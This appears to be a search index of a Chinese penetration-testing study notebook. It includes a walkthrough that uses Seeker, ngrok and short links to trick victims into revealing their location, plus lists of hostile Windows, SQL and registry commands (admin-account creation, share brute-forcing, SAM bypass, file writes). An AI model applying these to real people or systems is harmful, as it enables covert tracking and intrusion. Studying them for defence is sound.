{"./":{"url":"./","title":"前言","keywords":"","body":"前言 ​ 本书由None（none.org.cn）创作，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布。 《0DAY计划》是什么 ​ 《0day计划》是本人在网络安全的世界里，学习探索过程中记录总结的零散知识和心得经验，是一本学习笔记。正是如此，本书很多章节尚未完成，今后会在学习的过程中不断完善内容，期望能形成系统化的知识结构。 免责声明 ​ 阁下阅读本书即表示同意以下免责声明，需遵守以下约定及当地法律，违反约定所带来的后果由阁下自负。 ​ 本书旨在记录和分享本人的学习经验，内容可能带有攻击性，仅供安全研究与教学之用，读者将其用做其他用途，将由读者承担全部法律及连带责任，本人不承担任何法律及连带责任。 Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2021-01-18 22:12 "},"社工/获取位置信息.html":{"url":"社工/获取位置信息.html","title":"获取位置信息","keywords":"","body":"获取位置信息 总体思路 首先用Seeker建立一个用于获取对方位置信息的虚假页面，然后用Ngrok建立一个隧道将公网域名连接在本地用Seeker上搭建的虚假页面，接着可以选择用短网址转换的方式对公网域名进行伪装，于是当对方点击了该链接并同意获取位置信息后，我们即可在本机上得到这些信息。 目标页面 选择（创造）一个对目标具有诱惑性的页面/网站。 构建获取定位信息网页 Seeker介绍 Seeker是一款可以获取高精度地理和设备信息的工具。其在内置PHP服务器上托管了一个虚假网站，网站要求提供位置许可，如果目标允许，我们将可以获得对方的设备信息和位置信息。 Seeker用于获取位置信息的模板位于/seeker/template/目录下。 获取&运行seeker root@kali:~# git clone https://github.com/thewhiteh4t/seeker.git root@kali:~# cd seeker/ root@kali:~/seeker# ./install.sh [!] Updating... [!] Installing Dependencies... Python3 PHP ssh Requests [!] Setting Permissions... [!] Installed. root@kali:~/seeker# python3 seeker.py -t manual 使用隧道转发实现内网穿透 Ngrok介绍 Ngrok是一款内网穿透的工具，用于将本地的端口转发到公网上，以便于连接。只需告诉ngrok Web服务器正在侦听的本地端口即可。这样既可以将本地的web服务转发到公网上，也不至于暴露自身的IP。 获取&运行ngrok #搭建起本机与ngrok服务器的隧道（此次的端口应与seeker设置的一致） root@kali:~# ./ngrok http 8080 短网址域名伪装 将以上ngrok产生的网址进行短网址转换进行伪装，以增加可信度。 实际测试 手机端： kali端： 总结 整个过程能否成功的关键在于利用社会工程学诱使对方点击链接并同意授权位置信息，而获取到的位置信息精度则取决于目标设备。 此过程纯粹只是一个概念证明，仅用于教育目的。其主要目的是警示大家不要轻易点击来路不明的链接并授予关键权限，否则你将可能暴露你的设备信息甚至你的位置信息等。 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 11:00 "},"第一阶段-基础篇/零基础必看课程.html":{"url":"第一阶段-基础篇/零基础必看课程.html","title":"零基础必看课程","keywords":"","body":"零基础必看课程 基础部分 渗透测试 明确目标 信息收集（基础、系统、应用、版本、服务、人员、防护信息） 漏洞探测（系统、WebServer、Web应用、其他端口服务漏洞、通信安全） 漏洞验证（自动化、手工、实验验证；登录猜解、业务漏洞验证） 信息分析（精确打击、绕过防御机制、定制攻击路径、绕过检测机制、攻击代码） 获取所需（实施攻击、获取内部信息、进一步渗透、持续性攻击、清理痕迹） 信息整理 形成报告 虚拟机及系统安装 （略） 虚拟机功能介绍及使用 （略） 网站篇 http协议：超文本传输协议（HTTP，HyperText Transfer Protocol）是互联网上应用最为广泛的一种网络协议。所有的WWW文件都必须遵守这个标准。设计HTTP最初的目的是为了提供一种发布和接收HTML页面的方法。 http头讲解：（详解https://www.cnblogs.com/poissonnotes/p/4844014.html 200：响应状态码 Accept-Ranges：响应的 HTTP 标头是由服务器使用以通告其支持部分请求的标志物。此字段的值表示可用于定义范围的单位。 Content-Length：请求消息正文的长度 Date ：发送HTTP消息的日期 静态网站：静态网站是指全部由HTML（标准通用标记语言的子集）代码格式页面组成的网站，所有的内容包含在网页文件中。网页上也可以出现各种视觉动态效果，如GIF动画、FLASH动画、滚动字幕等，而网站主要是静态化的页面和代码组成，一般文件名均以htm、html、shtml等为后缀 动态网站：动态网站并不是指具有动画功能的网站，而是指网站内容可根据不同情况动态变更的网站，一般情况下动态网站通过数据库进行架构。动态网站除了要设计网页外，还要通过数据库和编程序来使网站具有更多自动的和高级的功能。动态网站体现在网页一般是以asp，jsp，php，aspx等结束，而静态网页一般是HTML（标准通用标记语言的子集）结尾，动态网站服务器空间配置要比静态的网页要求高，费用也相应的高，不过动态网页利于网站内容的更新，适合企业建站。动态是相对于静态网站而言。 判断一个网站是什么类型的小技巧：在后面加/index.html 或 /index.php 判断一个网站所用系统的小技巧：更改后面字母的大小写，Linux报错win不报错 网站搭建： 服务器配置： 点击详细信息 网站默认本地文件夹：wwwroot 配置DNS服务：添加或删除角色→自定义→DNS服务器→下一步。。。 DNS&域名：\"正向查找\"右键新建区域→下一步。。。右边空白区域右键新建主机→下一步。。。 【DNS改为本地解析127.0.0.1（本地连接属性→TCP/IP属性）】 添加ip：“运行”ncpa.cpl→属性→TCP/IP属性→设定IP→高级→添加 网站能正常运行：需满足【ip，端口(改为1024~65535)，域名】至少一个不同 网站权限配置：右键权限→添加→高级→立即查找→everyone ASP服务启用允许 网站配置：右键属性→【主目录】执行权限：纯脚本→点击配置→选项：启用父路径；调试：启用两个调试→【文档】启用默认文档内容：index.asp 实操成果： Windows基础 系统目录、服务、端口、注册表 系统目录 Program Files：64位软件安装目录 Program Files(x86)：32位软件安装目录 MyDrivers：驱动文件夹 PerfLogs：日志文件夹 自启动文件夹：C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 系统配置文件：C:\\Windows\\System32【config文件夹里的SAM文件为用户账号密码文件（进入PE系统将SAM文件删除即可绕过密码登录）】 hosts文件：C:\\Windows\\System32\\drivers\\etc 服务 作用： 决定计算机的一些功能是否被启用 不同服务对应的功能不同 通过计算机提供的服务可以有效实现资源共享 常见的服务：web服务、dns服务、dhcp服务、邮件服务、telnet服务、ssh服务、ftp服务、smb服务 查看服务命令：services.msc Telnet入侵：DOS命令：telnet 目标ip 端口 计算机“端口”是英文port的义译，可以认为是计算机与外界通讯交流的出口。按端口号可分为3大类：公认端口（Well Known Ports）；注册端口（Registered Ports）；动态和/私有端口（Dynamic and/or Private Ports），共有65535个端口 通过端口可以进行：信息搜集、目标探测、服务判断、系统判断、系统角色分析 注册表 打开注册表：打开“运行”输入regedit回车 注册表作用：注册表是windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着windows的启动、硬件驱动程序的装载以及一些windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。 HKEY_CLASSES_ROOT管理文件系统。 根据在Windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息 HKEY_CURRENT_USER管理系统当前的用户信息。 在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户登录用户名和暂存的密码。在用户登录Windows 98时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中。 HKEY_LOCAL_MACHINE管理当前系统硬件配置。 在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息，或者在远程计算机中可访间的一组键中。这个根键里面的许多子键与System.ini文件中设置项类似。 HKEY_USERS管理系统的用户信息。 在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。 HKEY_CURRENT_CONFIG管理当前用户的系统配置。 在这个根键中保存着定义当前用户桌面配置（如显示器等等的数据该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的Windows 98中文版的安装的信息。 利用注册表防病毒： 不少计算机系统感染了网络病毒后，可能会在这些注册表中做修改 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices 病毒经常修改的注册表键值 IE起始页的修改 HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main右半部分窗口中的Start Page就是用户当前设置的IE浏览器主页地址了 Internet选项按钮灰化&失效 HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel下的DWORD值“Setting”=dword:1 “Links”=dword:1 “SecAddSites”dword:1全部改为0之后再到HKEY_USERS.DEFAULT\\Software\\Policies\\Microsoft\\Internet Explorer\\Control Panel下的DWORD值“homepage”键值改为0则无法使用“Internet选项”修改IE设置 “源文件”项不可用 HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions的“NoViewSource”被设置为1了，改为0就可恢复正常 “运行”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoRun”键值被改为1了，改为0就可恢复 “关机”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoClose”键值被改为1了，改为0就可恢复 “注销”按钮被取消&失效 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoLogOff”键值被改为1了，改为0就可恢复 磁盘驱动器被隐藏 HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer的“NoDrives”键值被改为1了，改为0就可恢复。 入侵中常用的注册表： HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mysqlpass HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mssqlpss HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\Settings\\mastersvrpass HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFTINSTALLFREEADMIN\\11 HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFTINSTALLFreeHost\\11 黑客常用的DOS命令及批处理 常用DOS命令 color ？ 改变cmd颜色 ping -t -1 65500 ip（死亡之ping，发送大于64K的文件并一直ping） ipconfig /all 查看IP及详细信息 ipconfig/release 释放IP ipconfig/renew 重新获得IP systeminfo 查看系统信息（补丁信息） arp -a 查看局域网内的IP和MAC net view 查看局域网内其他计算机名称 shutdown -s -t 60 -c \"你被黑了\"（-s关机，-r重启，-t倒计时，-c弹窗提示内容） shutdown -a（取消关机） dir 查看目录 cd 切换目录 start www.google.com 打开网页 md 目录名 创建目录 copy con C:\\123.txt 在C盘根目录下创建123.txt文件（Ctrl+Z，回车保存） del 123.txt 删除123.txt tree 树形列出文件夹结构 net use k: \\192.168.1.1\\c$ 将目标IP的C盘映射到本地K盘（可用hydra爆破用户密码） net use k: \\192.168.1.1\\c$ /del 删除 net start 查看开启了哪些服务 net start 服务名 开启服务 net stop 服务名 关闭服务 net user 查看用户 net user 用户名 查看用户属性 net user 用户名 密码 /add 建立用户 net user 用户名 /del 删除用户 net localgroup administrator**s 用户名 /add** 把“用户”添加到管理员中使其具有管理员权限 net user guest /active:yes 激活guest用户 net user guest 123456 用guest用户登录后将密码改为123456 net password 密码 更改系统登录密码 net share 查看本地开启的共享 net share c$ /del 删除C：共享 net share ipc$ 开启ipc$共享 net share ipc$ /del 删除ipc$共享 netstat -a 查看开启了哪些端口，常用netstat -an netstat -n 查看端口的网络连接情况，常用netstat -an netstat -v 查看正在进行的工作 at id号 开启已注册的某个计划任务 at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止 at id号 /delete 停止某个已注册的计划任务 at 查看所有的计划任务 attrib 文件名(目录名) 查看某文件（目录）的属性 attrib 文件名-A-R-S-H或+A+R+S+H 去掉或添加某文件的存档，只读，系统，隐藏属性 cls 清屏 ping返回值TTL（默认情况下）：且每经过一个路由则-1 Linux系统的TTL值为64或255 Windows NT/2000/XP系统的TTL值为128 Windows 98系统的TTL值为32 UNIX主机的TTL值为255 批处理 批处理文件是dos命令的组合文件，写在批处理文件的命令会被逐一执行。后缀名为.bat 在cmd中编写批处理文件，copy con c:\\123.bat把输入的内容复制到文件123.bat中，“Ctrl+Z 回车”结束编辑 常用快捷键&优化系统 Windows常用快捷键 F1 显示当前程序或者windows的帮助内容。 F2 当你选中一个文件的话，这意味着“重命名” F3 当你在桌面上的时候是打开“查找：所有文件”对话框 ALT+F4 关闭当前应用程序中的当前文本（如word中） F5 刷新 CTRL+F5 强行刷新 CTRL+F6 切换到当前应用程序中的下一个文本（加shift 可以跳到前一个窗口） F10或ALT 激活当前程序的菜单栏 windows键或CTRL+ESC 打开开始菜单 CTRL+ALT+DELETE 在win9x中打开关闭程序对话框 DELETE 删除被选择的选择项目，如果是文件，将被放入回收站 SHIFT+DELETE 删除被选择的选择项目，如果是文件，将被直接删除而不是放入回收站 CTRL+N 新建一个新的文件 CTRL+O 打开“打开文件”对话框 CTRL+P 打开“打印”对话框CTRL+S保存当前操作的文件 CTRL+X 剪切被选择的项目到剪贴板 CTRL+INSERT或CTRL+C 复制被选择的项目到剪贴板 SHIFT+INSERT或CTRL+V 粘贴剪贴板中的项目 ALT+BACKSPACE 或CTRL+Z 撤销上一步的操作 Ctrl+Shift+ESC打开资源管理器 Win+M 最小化所有被打开的窗口。 Win+D 最小化所有窗口或恢复窗口 Win+L 锁屏 Win+F 打开“查找：所有文件”对话框 Win+R 打开“运行”对话框 系统优化 修改启动项 “运行”对话框中输入“msconfig\"命令，打开系统配置窗口岩找到“启动\"选项 加快系统启动速度 “运行”对话框中输入“msconfig”命令，打开系统配置窗口后找到“引导”选项（英文系统是Boot）。点击“高级选项”此时就可以看到我们将要修改的设置项了。 提高窗口切换提速 右击计算机属性---性能信息和工具---调整视觉效果（先点击让windows选择计算机的最佳设置---再点击自定义---把最后的勾选去掉--确定） 使用工具优化 登录密码破解、手动清除木马病毒 使用启动U盘破解： 微PE启动盘教程：http://www.wepe.com.cn/ubook/ 使用工具对hash值破解： LC5 彩虹表 手动清除木马： 查找开机启动项：“运行”msconfig 查询服务：“运行”services.msc 查看网络端口连接：DOS命令netstat -ano（常见木马端口4444,8888,9527） 拓展：https://www.cnblogs.com/vipsoft/p/3953790.html Linux基础 Linux系统的介绍、安装、密码的破解 Linux内核版本号：XX.YY.ZZ【XX为主版本号，YY为次版本号，次版本号为奇数表示开发版，偶数表示稳定版】 磁盘分区：主分区大于4表示为逻辑分区(例:第2块SCSI硬盘的第3个逻辑分区/dev/sdb7) Linux中默认使用的文件系统类型： EXT3 第3代扩展（Extended）文件系统 SWAP 交换文件系统 Linux支持的其它文件系统类型 FAT16、FAT32、NTFS XFS、JFS Linux系统目录结构，常用命令 Centos 7安装vmtools：点击“虚拟机”重新安装vmtools→打开终端输入“黄色标注”的命令→一直回车→安装完成后重启 Linux 中各个文件夹的作用https://blog.csdn.net/badguy_gao/article/details/78638735 / 根目录 /boot 引导程序，内核等存放的目录 /bin 普通用户可以使用的命令的存放目录 /sbin 超级用户可以使用的命令的存放目录 /lib 根目录下的所程序的共享库目录 /dev 设备文件目录 /home 普通用户的家目录 /root 用户root的$HOME目录 /etc 全局的配置文件存放目录 命令行提示符“#”表示为root用户，“$”表示为普通用户 字符界面与图形界面的切换：Ctrl+Alt+F1图形界面；Ctrl+Alt+F2~7字符界面 Linux命令 用于实现某一类功能的指令或程序 命令的执行依赖于解释器程序（例如：/bin/bash） Linux命令的分类 内部命令：属于Shell解释器的一部分（系统自带的命令） 外部命令：独立于Shell解释器之外的程序文件 命令行编辑的几个辅助操作 Tab键：自动补齐 反斜杠“\\”：强制换行 Ctrl+U：清空至行首 Ctrl+K：清空至行尾 Ctrl+L：清屏 Ctrl+C：取消本次命令编辑 Linux命令的通用命令格式：命令字+选项+参数（命令字 --help） 选项：用于调节命令的具体功能 以“-”引导短格式选项（单个字符），例如“-” 以“--”引导长格式选项（多个字符），例如“-color” 多个短格式选项可以写在一起，只用一个“-”引导，例如“-al\" 参数：命令操作的对象，如文件、目录名等 Linux常用命令： uname -a 查看系统相关信息，显示主机名、硬件平台等详细信息 uname -r 查看内核版本 hostname 主机名称 ifconfig 查看IP地址 cat /proc/cpuinfo 查看CPU信息 cat /proc/meminfo 查看内存信息 halt 或 shutdown -h now 关机 reboot 或 shutdown -r now 重启 pwd 查看当前工作目录 cd 目录位置 切换工作目录 mkdir -p /路径/目录名 创建新的目录 touch 文件名 新建空文件（若已有同名文件，则更新其修改日期，内容不变） ln -s 源文件或目录 链接文件或目标目录 为文件或目录建立快捷方式 mv 源文件或目录 目标文件或目录 移动文件或目录（若位置不变，则相当于改名） find 查找目录 查找条件 查找内容 用于查找文件或目录 常用查找条件： name：按文件名称查找（区分大小写） iname：不区分大小写 size：按文件大小查找（+1024表示大于1024的文件，反之-为小于，默认等于） user：按文件属性查找 type：按文件类型查找 cp 选项 源文件或目录 目标文件或目录 复制文件或目录 cp命令常用选项： r：递归复制整个目录树 p：保持源文件的属性不变 f：强制覆盖目标同名文件或目录 i：需要覆盖文件或目录时进行提醒 rm 选项 文件或目录 删除文件或目录 rm命令常用选项 f：强行删除文件或目录，不进行提醒 i：删除文件或目录时提醒用户确认 r：递归删除整个目录树 du 选项 目录或文件名 统计目录及文件的空间占用情况 du命令常用选项： a：统计时包括所有的文件，而不仅仅只统计目录 h：以更易读的字节单位（K、M等）显示信息 s：只统计每个参数所占用空间总的大小 ls 选项 目录或文件名 列表显示目录内容 ls命令常用选项： l：以长格式显示 a：显示所有子目录和文件的信息，包括隐藏文件 A：类似于“-a”，但不显示“.”和“..”目录的信息 d：显示目录本身的属性 h：以更易读的字节单位（K、M等）显示信息 R：递归显示内容 color：以颜色区分不同类型文件 最前面的-表示其为文件，l表示其为链接(快捷方式)，d表示其为目录 r=4，w=2，x=1，每块权限之和为7； 如：chmod 751 文件名 表示将该文件权限改为-rwxr-x--x. cat 显示文件的全部内容 cat -n 给输出的所有行加上编号 cat 1 2 > 3 合并文件 wc 统计文件中的行数，单词数，字符数 l 统计行数 w 统计单词数 c 统计字符数 history 查看历史命令 压缩命令： gzip 文件名 文件名.gz 压缩文件（源文件变成压缩文件） gzip -9 文件名 文件名.gz 高压缩比压缩文件 gzip -d 文件名.gz 释放压缩文件 bzip2 文件名 文件名.bz2 用bzip2进行压缩（相对于gzip压缩率更高） bzip2 -9 文件名 文件名.bz2 高压缩比压缩文件 bzip2 -d 文件名.bz2 释放压缩文件 归档命令： tar -cvf 归档文件名.tar 被归档文件名1 被归档文件名2 将文件1、2归档，（归档后源文件仍存在） tar -xvf 归档文件名.tar 解包归档文件 tar -cvzf 文件名.tar.gz 被压缩的文件1 被压缩的文件2 创建归档压缩文件后缀为gz tar -cvjf 文件名.tar.bz2 被压缩的文件1 被压缩的文件2 创建归档压缩文件后缀为bz2 tar zxvf 文件.tar.gz 解压释放gz压缩文件 tar jxvf 文件.tar.bz2 解压释放bz2压缩文件 tar -xvzf 文件名.tar.gz -C /usr/src 解压释放归档到/usr/src里面 tar -xvjf 文件名.tar.bz2 -C /usr/src 解压释放归档到/usr/src里面 安装、升级、卸载RPM软件包： rpm 选项 RPM包文件 安装或升级RPM软件 不同选项适用于不同情况 i：安装一个新的RPM软件包 U：升级某个RPM软件，若原本未装，则进行安装 F：更新某个RPM软件，若原本未装，则放弃安装 rpm -e 软件名 卸载指定的RPM软件 apt-get instal 软件包 kali常见安装命令 dpkg -i 软件包 debian常见安装命令 useradd （选项） 用户名 添加用户账号，选项可省略 常用命令选项 u：指定UID标记号 d：指定宿主目录，缺省为/home/用户名 e：指定帐号失效时间 g：指定用户的基本组名（或UID号） G：指定用户的附加组名（或GID号） M：不为用户建立并初始化宿主目录 s：指定用户的登录Shell su - 用户名 切换用户 passwd 用户名 更改该用户密码 userdel -r 用户名 删除该用户（无-r则会保留该用户的宿主目录） 配置yum源：https://www.cnblogs.com/sunshine-H/p/8116701.html Vim编辑器及其命令：http://c.biancheng.net/vi/ Linux系统网络配置 ifconfig 查看所有活动的网络接口信息 ifconfig 网络接口名 查看指定网络接口信息 eth0：以太网 1o：（虚拟）回环设备 ppp0：使用PPP协议的串备（通常指调制解调器） tr0：令牌环（Token Ring） fddi0：光纤 hostname 查看或设置当前主机名 netstat 选项 查看系统的网络连接状态、路由器、接口统计等信息 常用选项： a：显示所有活动连接 n：以数字形式显示 p：显示进程信息 t：查看TCP协议相关信息 u：查看UDP协议相关信息 r：显示路由表信息 网络接囗配置文件在/etc/sysconfig/network-scripts/目录下 域名解析配置文件在/etc/resolv.conf文件下 网站根目录在/var/www/html/目录下 service network restart 重启网络服务（配置完网络后需要重启网络服务） ifdown 网络接口名 禁用网络接口 ifup 网络接口名 启用网络接口 设置路由记录——route route del default gw IP地址 删除路由表中的默认网关记录 route add default gw IP地址 向路由表中添加默认网关记录 route add -net 网段地址/24 gw IP地址 添加到指定网段的路由记录 route del-net 网段地址 删除到指定网段的路由记录 网络基础 网络架构以及TCP/IP协议 网络架构： 局域网 ( LAN ) & 广域网 ( WAN ) OSI参考模型： OSI RM：开放系统互连参考模型（Open System Interconnection Reference Model）OSI参考模型具有以下优点 简化了相关的网络操作 提供设备间的兼容性和标准接口 促进标准化工作 结构上可以分隔 易于实现和维护 内网IP： A级：10.0.0.1 - 10.255.255.254 B级：172.16.0.1 - 172.31.255.254 C级：192.168.0.1 - 192.168.255.254 交换机、路由器的作用及配置 （略） end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 13:09 "},"第一阶段-基础篇/Windows基础.html":{"url":"第一阶段-基础篇/Windows基础.html","title":"Windows基础","keywords":"","body":"Windows基础 ”运行“mstsc 打开远程桌面连接（3389端口） ”运行“gpedit.msc 打开本地组策略编辑器 ”运行“services.msc 打开服务 ”运行“otepad 打开笔记本 ”运行“regefit 打开注册表 ”运行“control 打开控制面板 CertUtil -hashfile C:\\xxx.tar MD5 此命令不仅可以做MD5哈希算法校验，还支持其他的哈希算法，具体如下： CertUtil -hashfile 文件路径 [算法] 支持的算法有：MD2 MD4 MD5 SHA1 SHA256 SHA384 SHA512 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:44 "},"第一阶段-基础篇/数据库基础.html":{"url":"第一阶段-基础篇/数据库基础.html","title":"数据库基础","keywords":"","body":"数据库基础 进入MySQL的方法：在MySQL的bin目录下cmd，mysql.exe -h 主机名(IP) -u 用户名 -p回车输入密码 显示数据库：show databases; 增加数据库：create database 数据库名; 删除数据库：drop database 数据库; 打开数据库：use 数据库名; 显示当前打开的数据库名：select database(); 查看指定数据库中的所有表：show tables; 查看特定表的详细设计信息：describe 表名; 这数据库中创建一个表：create table 表名; 查看表的结构：desc 表名; 增删查改 添加：insert into 表名 values (，，，，顺序排列的数据);（如果数据是字符型，必须使用单引号或者双引号）【insert into users(id,username.password) values(3,'admin3','admin3');】 查询：selec * from 表名 where 条件;【条件如：username='admin'】 删除：delete from 表名 where 条件; 修改：update 表名 set 修改内容 where 条件;【如：update users set id=2 where id=3；】 常用函数 select database();当前使用的数据库 select user();当前数据库用户 select version(); 数据库版本 select load_file(\"文件的绝对路径\");写入文件到数据库【用反斜杠\"/\"】 show global variables like \"%secure% \";查看secure_file_priv变量指向的允许上传文件的位置【默认的为NULL。即不允许导入导出。修改mysql.ini 文件，在[mysqld] 下加入“secure_file_priv =”保存，重启mysql。5.5版本前不需要】 select (\"十六进制字符串\") into dumpfile \"目标路径/01.txt\";在目标路径下创建01.txt【只能写一行】 select …… into outfile \"目标路径\"; 同上【可写多行】 end. Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2020-07-20 10:43 "},"第二阶段-Web安全篇/2019网络安全训练营.html":{"url":"第二阶段-Web安全篇/2019网络安全训练营.html","title":"2019网络安全训练营","keywords":"","body":"2019网络安全训练营 第一阶段-环境搭建 Metasploitable2 Metasploitable2虚拟系统是一个特别制作的ubuntu操作系统，本身设计作为安全工具测试和演示常见漏洞攻击。版本2已经可以下载，并且比上一个版本包含更多可利用的安全漏洞。这个版本的虚拟系统兼容VMware，VirtualBox，和其他虚拟平台。默认只开启一个网络适配器并且开启NAT和Host-only，本镜像一定不要暴漏在一个易受攻击的网络中。https://sourceforge.net/projects/metasploitable/files/latest/download Metasploitable2默认用户名：msfadmin 密码：msfadmin 网络配置 桥接模式（复制物理网络连接状态）是比较常用的一种网络模式，用来设置虚拟机与主机具有同等的网络地位。前提是需要在动态分配IP地址网络中，如果在静态分配IP地址的网络中，需要手动设置对应的IP地址。 NAT网络地址转换，主机与虚拟机构成一个网络，虚拟机可以与主机以外的网络通信，但是主机以外的网络无法与虚拟机通信。例如：局域网。 仅主机模式，虚拟机完全封闭，不与外部网络通信，只可以与当前主机进行通信。 构建自定义网络架构 在VM中添加新的网络实质是添加新的网卡配置，还要在设置添加网卡和Linux中进行配置：终端输入gedit interfaces回车，末尾换行输入auto eth1，换行输入iface eth1 inet dhcp（eth*可由ifconfig查看），然后重启网络/etc/init.d/networking restart 配置SSH功能 默认情况下Kali下的SSH不允许Root用户远程登录SSH。需要修改配置文件gedit /etc/ssh/sshd_config（修改内容：PermitRootLogin yes和PasswordAuthentication yes） service ssh start开启ssh服务，service ssh status查看ssh服务状态 常用网络命令 netstat -pantu 查看当前tcp udp监听端口 service ssh start/stop 开启/停止服务 ifconfig 查看当前IP地址 /etc/init.d/networking restart 重启网卡 ssh 用户名@IP地址 登录ssh服务 第二阶段-环境配置 Linux下文件操作常用命令 ls -alh -a 查看所有文件夹和文件（包括隐藏） -l 以长格式查看 -h 文件大小以K、M为单位 创建/删除文件夹：mkdir，rmdir 创建/删除文件：touch，rm 重命名文件：mv test1 test2 或 mv test1 ../test2 目录命令：pwd显示当前路径，cd切换目录， . 本级目录， .. 上级目录 Linux下权限相关命令 使用ls -alh查看文件权限信息（user所有者，group所属组，others其他人） chmod 421 文件名 调整权限 kali默认是python2，要用python3 *.py调用 下载github上的工具git clone https://github.com/arismelachroinos/lscript Nessus漏洞扫描器 Nessus是目前全世界最多人使用的系统漏洞扫描与分析软件。总共有超过75000个机构使用Nessus作为扫描该机构电脑系统的软件。官网：https://www.tenable.com 下载：https://www.tenable.com/downloads/nessus ，安装dpkg -i Nessus-8.7.2-debian6_amd64.deb 启动：/etc/init.d/nessusd start 然后打开https://kali:8834/ Win2003 Win2003 IIS 6.0是提供web服务的中间件，存在很多安全问题。比如IIS PUT，解析漏洞等 第三阶段-主机探测 二层主机探测 二层主机探测指：利用OSI中链路层中的协议进行主机发现。一般使用ARP协议。 优点：（局域网中通信使用ARP协议，利用MAC地址作为对应的识别地址） 速度快 可靠性高 缺点：无法扫描经过路由的主机 arping工具 Kali linux下自带工具arping可以进行对应的二层主机发现。缺点：无法多个主机同时扫描。 netdiscover工具 Kali linux自带工具netdiscover可以针对特定子网进行多主机扫描。 三层主机探测 三层主机探测指：利用OSI中网络中的协议进行主机发现。一般使用ICMP协议。 优点： 可以发现远程主机，经过路由的主机 速度相对比较快 缺点： 经常被防火墙过滤 速度相比二层发现慢 ping工具 ping工具在Linux和windows都有自带，Linux下ping如果不指定-c参数，一直扫描。Windows下默认进行四次探测。 fping工具 Kali linux下自带工具fping可以进行对应的三层主机发现。可以针对多个主机同时进行主机发现 如：fping -g 192.168.31.0/24 hping3工具 Kali linux自带工具hping3对目标进行三层主机发现。特点：发送自定义ICMP数据包以绕过防火墙 如：hping3 -c 2 --icmp 192.168.31.1 四层主机探测 四层发现指利用OSI中的传输层协议进行主机发现，一般使用TCP、UDP探测。 优点： 可以探测远程主机 比三层发现更为可靠 缺点：花费时间更长 nmap工具 Kali linux自带的Nmap可以进行二、三、四层的探测。nmap IP地址 hping3工具 Kali linux下自带工具hping3可以进行对应的四层层主机发现。hping3 --udp -c 3 IP地址 主机探测脚本 使用Github上分享的主机发现脚本：https://github.com/Cyber-Forensic/nWatch Tip：【安装过程中显示ImportError: No module named nmap报错，则运行pip install python-nmap，若未找到pip命令，则先运行apt install python-pip】 第四阶段-端口扫描 基本介绍 \"端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部端口，不可见。例如计算机中的80端口、21端口、23端口等。 一台拥有IP地址的主机可以提供许多服务，比如Web服务、FTP服务、SMTP服务等，这些服务完全可以通过1个IP地址来实现。那么，主机是怎样区分不同的网络服务呢？显然不能只靠IP地址，因为IP地址与网络服务的关系是一对多的关系。实际上是通过“IP地址+端口号”来区分不同的服务的。 因此，一个开放的端口代表一个提供的服务，（不同的服务具有不同的端口号，因此要对服务进行测试，首先要确定是否开放对应端口号。 扫描工具Nmap 使用Nmap扫描指定主机的端口信息。Nmap具有多张扫描端口的技术。 扫描工具Dmitry 使用dmitry进行端口扫描，其中p参数指定dmitry进行tcp端口扫描。 扫描工具netcat 使用Netcat进行端口扫描。nc -nvz IP地址 端口范围 端口的分类 端口范围0-65535，TCP端口和UDP端口。由于TCP和UDP两个协议是独立的，因此各自的端口号也相互独立，比如TCP有235端口，UDP也可以有235端口，两者并不冲突。 端口分为： 周知端口 周知端口是众所周知的端口号，范围从0到1023，其中80端口分配给WWW服务，21端口分配给FTP服务等。我们在浏览器的地址栏里输入一个网址的时候是不必指定端口号的，因为在默认情况下WWW服务的端口是“80”。 动态端口 动态端口的范围是从49152到65535。之所以称为动态端口，是因为它一般不固定分配某种服务，而是动态分配。 注册端口 